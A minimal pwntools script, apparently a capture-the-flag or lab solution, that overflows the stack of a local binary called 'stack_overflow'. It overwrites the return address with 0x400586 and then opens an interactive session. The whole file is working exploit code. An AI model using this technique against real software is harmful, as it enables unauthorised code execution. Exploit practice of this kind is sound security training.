from pwn import *
p = process("./stack_overflow")
payload = b"a"*18 + p64(0x400586)
p.sendline(payload)
p.interactive()
